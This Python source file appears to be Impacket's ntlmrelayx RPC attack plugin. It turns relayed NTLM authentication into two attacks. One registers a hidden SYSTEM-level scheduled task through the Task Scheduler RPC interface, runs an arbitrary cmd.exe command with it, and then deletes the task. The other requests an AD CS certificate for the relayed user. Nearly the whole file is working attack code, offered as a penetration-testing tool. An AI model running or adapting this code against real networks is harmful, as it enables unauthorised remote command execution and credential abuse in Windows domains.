# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Authors:
#   Arseniy Sharoglazov <mohemiv@gmail.com> / Positive Technologies (https://www.ptsecurity.com/)
#   Based on @agsolino and @_dirkjan code
#

import time
import string
import random
from typing import Tuple

from impacket import LOG
from impacket.dcerpc.v5 import tsch, icpr
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.x509.oid import NameOID

PROTOCOL_ATTACK_CLASS = "RPCAttack"

class TSCHRPCAttack:
    def _xml_escape(self, data):
        replace_table = {
             "&": "&amp;",
             '"': "&quot;",
             "'": "&apos;",
             ">": "&gt;",
             "<": "&lt;",
             }
        return ''.join(replace_table.get(c, c) for c in data)

    def _run(self):
        # Here PUT YOUR CODE!
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])

        cmd = "cmd.exe"
        args = "/C %s" % self.config.command

        LOG.info('Executing command %s in no output mode via %s' % (self.config.command, self.stringbinding))

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % (self._xml_escape(cmd), self._xml_escape(args))

        LOG.info('Creating task \\%s' % tmpName)
        tsch.hSchRpcRegisterTask(self.dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)

        LOG.info('Running task \\%s' % tmpName)
        done = False

        tsch.hSchRpcRun(self.dce, '\\%s' % tmpName)

        while not done:
            LOG.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
            resp = tsch.hSchRpcGetLastRunInfo(self.dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                time.sleep(2)

        LOG.info('Deleting task \\%s' % tmpName)
        tsch.hSchRpcDelete(self.dce, '\\%s' % tmpName)
        LOG.info('Completed!')

class ICPRAttack:
    
    PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
    
    def _run(self):
        csr, key = self.create_csr(username=self.username)
        attributes = ["CertificateTemplate:User"]
        
        LOG.info('Requesting certificate for %s with template Machine' % self.username)
        resp = icpr.hIcprRpcCertServerRequest(dce=self.dce, der=self.csr_to_der(csr), ca=self.config.ca, attributes=attributes)
        error_code = resp["pdwDisposition"]
        request_id = resp["pdwRequestId"]

        if error_code == 3:
            LOG.info("Successfully requested certificate")
        else:
            if error_code == 5:
                LOG.warning("Certificate request is pending approval")
            else:
                LOG.error(
                        "Got error while trying to request certificate: %s" % error_code
                    )



    def csr_to_der(self, csr: x509.CertificateSigningRequest) -> bytes:
        return csr.public_bytes(Encoding.DER)

    def generate_rsa_key(self) -> rsa.RSAPrivateKey:
        return rsa.generate_private_key(public_exponent=0x10001, key_size=2048)

    def create_csr(self, username: str, key: rsa.RSAPrivateKey = None) -> Tuple[x509.CertificateSigningRequest, rsa.RSAPrivateKey]:
        if key is None:
            key = self.generate_rsa_key()

        csr = x509.CertificateSigningRequestBuilder()

        csr = csr.subject_name(
            x509.Name(
                [
                    x509.NameAttribute(NameOID.COMMON_NAME, username),
                ]
            )
        )

        return (csr.sign(key, hashes.SHA256()), key)


class RPCAttack(ProtocolAttack, TSCHRPCAttack, ICPRAttack):
    PLUGIN_NAMES = ["RPC"]

    def __init__(self, config, dce, username):
        ProtocolAttack.__init__(self, config, dce, username)
        self.dce = dce
        self.rpctransport = dce.get_rpc_transport()
        self.stringbinding = self.rpctransport.get_stringbinding()

    def run(self):
        # Here PUT YOUR CODE!

        # TODO: support relaying RPC to different endpoints
        # TODO: support for providing a shell
        # TODO: support for getting an output
        if self.config.rpc_mode == 'ICPR':
          ICPRAttack._run(self)
        elif self.config.rpc_mode == 'TSCH': 
          if self.config.command is not None:
              TSCHRPCAttack._run(self)
          else:
              LOG.error("No command provided to attack")
        else:
          raise NotImplementedError("Not implemented!")
